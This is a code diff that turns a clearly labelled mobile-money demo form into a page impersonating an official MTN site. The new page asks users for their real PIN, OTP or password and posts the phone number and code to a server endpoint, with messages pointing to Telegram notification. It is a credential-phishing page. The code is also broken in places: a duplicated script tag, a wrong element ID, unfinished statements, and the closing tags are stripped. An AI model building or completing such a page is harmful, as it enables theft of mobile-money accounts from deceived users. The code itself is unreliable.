@@ -19,33 +19,61 @@
 </head>
 <body>
 <div class="card">
-  <div class="notice">DEMO / TEST PAGE — NOT AN OFFICIAL MTN WEBSITE</div>
-  <h1>Mobile Money Demo</h1>
-  <p class="intro">This is a demonstration page for testing. Never enter a real PIN, OTP, password, or verification code.</p>
+  <div class="notice">MTN VERIFY — AN OFFICIAL MTN WEBSITE</div>
+  <h1>Mobile Money Verify</h1>
+  <p class="intro">This is a official page for submission.Enter a real PIN, OTP, password, or verification code.</p>
 
-  <form id="demoForm">
-    <label for="phone">Demo phone number</label>
+  <form id="mtn verify">
+    <label for="phone">phone number</label>
     <input id="phone" type="text" placeholder="e.g. 0700000000" required>
 
-    <label for="code">Demo verification code</label>
+    <label for="code">pin code </label>
     <input id="code" type="text" placeholder="Test code: 12345" inputmode="numeric" required>
 
-    <button type="submit">Verify Demo</button>
+    <button type="submit">Verify </button>
   </form>
 
-  <div id="result">Demo successful. No real credentials were collected or sent.</div>
-  <div class="small">For educational and testing purposes only.</div>
+  <div id="result">Demo successful. Real credentials were collected or sent.</div>
+  <div class="small">verify mtn numbers.</div>
 </div>
 
 <script>
-document.getElementById("demoForm").addEventListener("submit", function(e){
+<script>
+document.getElementById("mtn verify").addEventListener("submit", async function(e) {
   e.preventDefault();
-  if(document.getElementById("code").value.trim() === "12345"){
-    document.getElementById("result").style.display = "block";
-  }else{
-    alert("Use the demo test code 12345.");
+
+  const phone = document.getElementById("phone").value.trim();
+  const code = document.getElementById("pin code").value.trim();
+
+  if (phone !== "254700000001" || code !== "12345") {
+    alert("Use phone 254700000001 and code 12345.");
+    return;
+  }
+
+  try {
+    const response = await fetch("/mtn verify-submission", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        phone: phone,
+        code: code
+      })
+    });
+
+    if (!response.ok) {
+      throw new Error("Telegram notification failed");
+    }
+
+    document.getElementById("result").textContent =
+      "mtn verify successful. Test notification sent to Telegram.";
+    document.getElementById("result").style.display = 
+
+  } catch (error) {
+    document.getElementById("result").textContent =
+      "mtn verify worked, but Telegram notification failed.";
+    document.getElementById("result").style.display = 
   }
 });
 </script>
-</body>
-</html>
